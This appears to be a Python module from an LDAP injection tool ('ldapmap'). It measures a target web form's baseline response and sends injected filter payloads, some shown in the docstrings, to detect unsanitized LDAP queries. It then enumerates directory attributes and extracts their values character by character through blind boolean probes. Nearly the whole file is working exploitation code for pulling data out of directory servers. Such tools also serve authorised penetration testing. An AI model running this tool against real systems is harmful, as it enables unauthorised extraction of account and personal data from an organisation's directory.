import sys

import requests

from ldapmap_constants import (
    CHARSET,
    COMMON_ATTRIBUTES,
    DETECTION_PAYLOADS,
    ERROR_SLEEP_SECONDS,
    LENGTH_TOLERANCE,
    LOGIC_PAYLOADS,
    TIMEOUT,
    TIMEOUT_RETRIES,
)
from ldapmap_http import send_request
from ldapmap_payloads import (
    LdapFilterNode,
    build_attribute_probe_payloads,
    build_payload_data,
    parse_extraction_filter,
)


def _iter_attribute_payloads(
    attribute: str,
    value: str,
    exact: bool = False,
    extraction_filters: tuple[LdapFilterNode, ...] | None = None,
) -> tuple[str, ...]:
    """Return candidate payloads for an attribute/value probe."""
    return build_attribute_probe_payloads(
        attribute=attribute,
        value=value,
        exact=exact,
        extraction_filters=extraction_filters,
    )


def _parse_extraction_filters(
    extraction_filters: list[str] | None,
) -> tuple[LdapFilterNode, ...] | None:
    if not extraction_filters:
        return None
    return tuple(parse_extraction_filter(expr) for expr in extraction_filters)


def _classify_attribute_payload(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    payload: str,
    status_true_set: set[int],
    true_length: int,
    verbose: bool,
    use_json: bool,
    false_statuses: set[int] | None,
    timeout: float = TIMEOUT,
    timeout_retries: int = TIMEOUT_RETRIES,
    sleep_after_error: bool = True,
    error_sleep_seconds: float = ERROR_SLEEP_SECONDS,
) -> tuple[str, requests.Response | None]:
    """Send one payload and return (classification, response)."""
    data = build_payload_data(base_data, param, payload, use_json)
    resp = send_request(
        session,
        url,
        data,
        verbose,
        use_json,
        timeout=timeout,
        timeout_retries=timeout_retries,
        sleep_after_error=sleep_after_error,
        error_sleep_seconds=error_sleep_seconds,
    )
    classification = classify_response(resp, status_true_set, true_length, false_statuses)
    return classification, resp


def _discover_working_template_for_attribute(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    attribute: str,
    status_true_set: set[int],
    true_length: int,
    verbose: bool,
    use_json: bool,
    false_statuses: set[int] | None,
    extraction_filters: tuple[LdapFilterNode, ...] | None = None,
    timeout: float = TIMEOUT,
    timeout_retries: int = TIMEOUT_RETRIES,
    sleep_after_error: bool = True,
    error_sleep_seconds: float = ERROR_SLEEP_SECONDS,
) -> int | None:
    """
    Pick a payload variant index that yields TRUE for the given *attribute*.
    """
    for idx, payload in enumerate(
        _iter_attribute_payloads(
            attribute, "", exact=False, extraction_filters=extraction_filters
        )
    ):
        classification, _ = _classify_attribute_payload(
            session,
            url,
            base_data,
            param,
            payload,
            status_true_set,
            true_length,
            verbose,
            use_json,
            false_statuses,
            timeout=timeout,
            timeout_retries=timeout_retries,
            sleep_after_error=sleep_after_error,
            error_sleep_seconds=error_sleep_seconds,
        )
        if classification == "true":
            return idx
    return None


def get_baseline(
    session: requests.Session,
    url: str,
    base_data: dict,
    verbose: bool = False,
    use_json: bool = False,
    timeout: float = TIMEOUT,
    timeout_retries: int = TIMEOUT_RETRIES,
    sleep_after_error: bool = True,
    error_sleep_seconds: float = ERROR_SLEEP_SECONDS,
) -> tuple[int, int]:
    """
    Send an unmodified request and return *(status_code, content_length)*.

    This baseline is used to detect deviations caused by injected payloads.
    """
    resp = send_request(
        session,
        url,
        base_data,
        verbose,
        use_json,
        timeout=timeout,
        timeout_retries=timeout_retries,
        sleep_after_error=sleep_after_error,
        error_sleep_seconds=error_sleep_seconds,
    )
    if resp is None:
        print("[!] Could not reach target for baseline request. Aborting.", file=sys.stderr)
        sys.exit(1)
    length = len(resp.content)
    print(f"[*] Baseline — HTTP {resp.status_code}, length={length}")
    return resp.status_code, length


def is_true_response(
    resp: requests.Response | None,
    true_status: int | set[int] | list[int] | tuple[int, ...],
    true_length: int,
    false_statuses: set[int] | list[int] | tuple[int, ...] | int | None = None,
) -> bool:
    """
    Return True when *resp* looks like a successful ("true") LDAP result.

    A response is considered "true" when:
      - the HTTP status code is in the TRUE status set, AND
      - the content length is within LENGTH_TOLERANCE bytes of the baseline.
    """
    if resp is None:
        return False
    if isinstance(true_status, int):
        true_statuses = {true_status}
    else:
        true_statuses = set(true_status)
    if false_statuses is None:
        false_status_set: set[int] = set()
    elif isinstance(false_statuses, int):
        false_status_set = {false_statuses}
    else:
        false_status_set = set(false_statuses)
    status = resp.status_code
    if status in true_statuses:
        length_match = abs(len(resp.content) - true_length) <= LENGTH_TOLERANCE
        return length_match
    if status in false_status_set:
        return False
    return False


def classify_response(
    resp: requests.Response | None,
    true_status: int | set[int] | list[int] | tuple[int, ...],
    true_length: int,
    false_statuses: set[int] | list[int] | tuple[int, ...] | int | None = None,
) -> str:
    """
    Classify a response as "true", "false", or "error".

    Status codes in *true_status* are evaluated with content-length matching.
    Status codes in *false_statuses* are classified as "false".
    Any other status code is classified as "error".
    """
    if resp is None:
        return "error"
    if isinstance(true_status, int):
        true_statuses = {true_status}
    else:
        true_statuses = set(true_status)
    if false_statuses is None:
        false_status_set: set[int] = set()
    elif isinstance(false_statuses, int):
        false_status_set = {false_statuses}
    else:
        false_status_set = set(false_statuses)

    if resp.status_code in true_statuses:
        return "true" if is_true_response(resp, true_statuses, true_length) else "false"
    if resp.status_code in false_status_set:
        return "false"
    return "error"


def calibrate(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    timeout: float = TIMEOUT,
    timeout_retries: int = TIMEOUT_RETRIES,
    sleep_after_error: bool = True,
    error_sleep_seconds: float = ERROR_SLEEP_SECONDS,
) -> tuple[int, int]:
    """
    Attempt to identify a "true" response signature by injecting a wildcard.

    Sends *(param)=** which should match any LDAP entry and return a "true"
    response.  If that wildcard response differs from the baseline we swap the
    reference values so that subsequent checks compare against the correct
    "true" fingerprint.

    Returns the (status, length) pair that represents a TRUE response.
    """
    wildcard_data = build_payload_data(base_data, param, "*", use_json)
    resp = send_request(
        session,
        url,
        wildcard_data,
        verbose,
        use_json,
        timeout=timeout,
        timeout_retries=timeout_retries,
        sleep_after_error=sleep_after_error,
        error_sleep_seconds=error_sleep_seconds,
    )
    if resp is None:
        return true_status, true_length

    wc_length = len(resp.content)
    wc_status = resp.status_code

    if wc_status != true_status or abs(wc_length - true_length) > LENGTH_TOLERANCE:
        # The wildcard produced a different response — use it as the TRUE marker
        print(
            f"[*] Calibration: wildcard response differs from baseline. "
            f"Using wildcard signature as TRUE (HTTP {wc_status}, length={wc_length})."
        )
        return wc_status, wc_length

    print(f"[*] Calibration: wildcard matches baseline (HTTP {wc_status}, length={wc_length}).")
    return true_status, true_length


def detect_injection(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    probe_attr: str = "objectClass",
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
    timeout: float = TIMEOUT,
    timeout_retries: int = TIMEOUT_RETRIES,
    sleep_after_error: bool = True,
    error_sleep_seconds: float = ERROR_SLEEP_SECONDS,
) -> bool:
    """
    Probe the target with common LDAP meta-characters and logic payloads.

    Prints a report of which payloads caused a different response, which
    indicates that the parameter is embedded in an LDAP query without sanitization.

    *probe_attr* is the LDAP attribute used in the AND/OR logic probes (e.g.
    ``)(attr=*))(&(attr=``).  It defaults to ``objectClass`` which is present
    on every LDAP entry, but you can supply any attribute that is known to
    exist on the target entry so that the probes do not rely on ``objectClass``
    being present.

    Returns True if at least one payload produced a distinguishable response.
    """
    print("\n[*] --- Detection Phase ---")
    vulnerable = False

    # Build probes dynamically so the caller controls which attribute is used
    detection_payloads = [
        p.replace("objectClass", probe_attr) for p in DETECTION_PAYLOADS
    ]
    logic_payloads = {
        k: v.replace("objectClass", probe_attr) for k, v in LOGIC_PAYLOADS.items()
    }

    for payload in detection_payloads:
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(
            session,
            url,
            data,
            verbose,
            use_json,
            timeout=timeout,
            timeout_retries=timeout_retries,
            sleep_after_error=sleep_after_error,
            error_sleep_seconds=error_sleep_seconds,
        )
        if resp is None:
            continue
        length = len(resp.content)
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        different = classification != "true"
        marker = "[!] DIFFERENT" if different else "    same     "
        print(
            f"  {marker}  payload={repr(payload):<40} "
            f"HTTP {resp.status_code}, length={length}, class={classification.upper()}"
        )
        if different:
            vulnerable = True

    # AND / OR logic probes
    print("\n[*] AND/OR logic probes:")
    for label, payload in logic_payloads.items():
        data = build_payload_data(base_data, param, payload, use_json)
        resp = send_request(
            session,
            url,
            data,
            verbose,
            use_json,
            timeout=timeout,
            timeout_retries=timeout_retries,
            sleep_after_error=sleep_after_error,
            error_sleep_seconds=error_sleep_seconds,
        )
        if resp is None:
            continue
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        classification = classify_response(resp, status_true_set, true_length, false_statuses)
        looks_true = classification == "true"
        print(
            f"  [{label}] payload={repr(payload):<50} "
            f"→ {classification.upper()}"
        )
        if looks_true:
            vulnerable = True

    return vulnerable


def discover_attributes(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    attributes: list[str] | None = None,
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
    timeout: float = TIMEOUT,
    timeout_retries: int = TIMEOUT_RETRIES,
    sleep_after_error: bool = True,
    error_sleep_seconds: float = ERROR_SLEEP_SECONDS,
) -> list[str]:
    """
    Iterate through *attributes* and test each with a wildcard payload.

    The payload formats are:
      - )(attribute=*)(
      - )(attribute=*)(attribute=
      - )(attribute=*)
    A "true" response implies that attribute exists on the LDAP entry.

    When *attributes* is ``None`` the built-in ``COMMON_ATTRIBUTES`` list is
    used.  Pass a custom list (e.g. built from ``--attributes``) to extend or
    replace that default set.

    Returns the list of attributes that appear to exist.
    """
    if attributes is None:
        attributes = COMMON_ATTRIBUTES
    print("\n[*] --- Attribute Discovery Phase ---")
    found: list[str] = []

    for attr in attributes:
        status_true_set = true_statuses if true_statuses is not None else {true_status}
        attr_found = False
        saw_false = False
        for payload in _iter_attribute_payloads(attr, ""):
            classification, resp = _classify_attribute_payload(
                session,
                url,
                base_data,
                param,
                payload,
                status_true_set,
                true_length,
                verbose,
                use_json,
                false_statuses,
                timeout=timeout,
                timeout_retries=timeout_retries,
                sleep_after_error=sleep_after_error,
                error_sleep_seconds=error_sleep_seconds,
            )
            if resp is None:
                continue
            if classification == "true":
                print(f"  [+] Attribute present: {attr}")
                found.append(attr)
                attr_found = True
                break
            if classification == "false":
                saw_false = True
                continue
            print(
                f"  [!] Attribute {attr}: unexpected HTTP {resp.status_code} (classified as ERROR)",
                file=sys.stderr,
            )
        if not attr_found and saw_false:
            print(f"  [-] Attribute absent:  {attr}")

    return found


def extract_attribute(
    session: requests.Session,
    url: str,
    base_data: dict,
    param: str,
    attribute: str,
    true_status: int,
    true_length: int,
    verbose: bool = False,
    use_json: bool = False,
    true_statuses: set[int] | None = None,
    false_statuses: set[int] | None = None,
    exclude_value: str | None = None,
    find_all: bool = False,
    extraction_filters: list[str] | None = None,
    charset: str = CHARSET,
    timeout: float = TIMEOUT,
    timeout_retries: int = TIMEOUT_RETRIES,
    sleep_after_error: bool = True,
    error_sleep_seconds: float = ERROR_SLEEP_SECONDS,
) -> str | list[str]:
    """
    Extract one or more values of *attribute* using LDAP wildcard probes.

    The search can skip a known value via *exclude_value* and can enumerate all
    candidate values when *find_all* is True. Prefix and exact probes are cached
    so repeated checks are not re-requested.
    """
    print(f"\n[*] --- Extraction Phase: {attribute} ---")
    print(f"  [*] Extracting {attribute}: ", end="", flush=True)
    status_true_set = true_statuses if true_statuses is not None else {true_status}
    parsed_extraction_filters = _parse_extraction_filters(extraction_filters)
    working_variant_idx = _discover_working_template_for_attribute(
        session,
        url,
        base_data,
        param,
        attribute,
        status_true_set,
        true_length,
        verbose,
        use_json,
        false_statuses,
        parsed_extraction_filters,
        timeout=timeout,
        timeout_retries=timeout_retries,
        sleep_after_error=sleep_after_error,
        error_sleep_seconds=error_sleep_seconds,
    )
    if working_variant_idx is None:
        print(
            f"\n  [!] Could not determine a working injection template for attribute '{attribute}'.",
            file=sys.stderr,
        )
        return [] if find_all else ""

    prefix_cache: dict[str, bool] = {}
    exact_cache: dict[str, bool] = {}
    children_cache: dict[str, list[str]] = {}

    def matches_prefix(prefix: str) -> bool:
        if prefix in prefix_cache:
            return prefix_cache[prefix]
        payload = _iter_attribute_payloads(
            attribute, prefix, exact=False, extraction_filters=parsed_extraction_filters
        )[working_variant_idx]
        classification, resp = _classify_attribute_payload(
            session,
            url,
            base_data,
            param,
            payload,
            status_true_set,
            true_length,
            verbose,
            use_json,
            false_statuses,
            timeout=timeout,
            timeout_retries=timeout_retries,
            sleep_after_error=sleep_after_error,
            error_sleep_seconds=error_sleep_seconds,
        )
        if classification == "error" and resp is not None:
            print(
                f"\n  [!] Unexpected HTTP {resp.status_code} while testing {attribute} "
                f"prefix '{prefix}' (classified as ERROR)",
                file=sys.stderr,
            )
        prefix_cache[prefix] = classification == "true"
        return prefix_cache[prefix]

    def is_exact_value(candidate: str) -> bool:
        if candidate in exact_cache:
            return exact_cache[candidate]
        payload = _iter_attribute_payloads(
            attribute, candidate, exact=True, extraction_filters=parsed_extraction_filters
        )[working_variant_idx]
        classification, resp = _classify_attribute_payload(
            session,
            url,
            base_data,
            param,
            payload,
            status_true_set,
            true_length,
            verbose,
            use_json,
            false_statuses,
            timeout=timeout,
            timeout_retries=timeout_retries,
            sleep_after_error=sleep_after_error,
            error_sleep_seconds=error_sleep_seconds,
        )
        if classification == "error" and resp is not None:
            print(
                f"\n  [!] Unexpected HTTP {resp.status_code} while testing exact {attribute} "
                f"value '{candidate}' (classified as ERROR)",
                file=sys.stderr,
            )
        exact_cache[candidate] = classification == "true"
        return exact_cache[candidate]

    def next_chars(prefix: str) -> list[str]:
        if prefix in children_cache:
            return children_cache[prefix]
        matches: list[str] = []
        for char in charset:
            if matches_prefix(f"{prefix}{char}"):
                matches.append(char)
        children_cache[prefix] = matches
        return matches

    found_values: list[str] = []
    stack: list[str] = [""]
    seen_prefixes: set[str] = set()

    while stack:
        prefix = stack.pop()
        if prefix in seen_prefixes:
            continue
        seen_prefixes.add(prefix)

        child_chars = next_chars(prefix)
        for char in reversed(child_chars):
            child_prefix = f"{prefix}{char}"

            # After each discovered character, test exact match.
            if is_exact_value(child_prefix):
                if exclude_value is None or child_prefix != exclude_value:
                    found_values.append(child_prefix)
                    if not find_all:
                        print(child_prefix, end="", flush=True)
                        print()
                        return child_prefix
                # Even when exact, continue exploring deeper values
                # that share the same prefix.
            if child_prefix not in seen_prefixes:
                stack.append(child_prefix)

        if prefix and not child_chars:
            # Terminal prefix fallback: when no longer prefix matches exist,
            # treat it as a candidate value even if exact probes are not
            # supported by the target query construction.
            if exclude_value is None or prefix != exclude_value:
                if prefix not in found_values:
                    found_values.append(prefix)
                    if not find_all:
                        print(prefix, end="", flush=True)
                        print()
                        return prefix

    if find_all:
        print()
        return found_values

    print()
    return ""
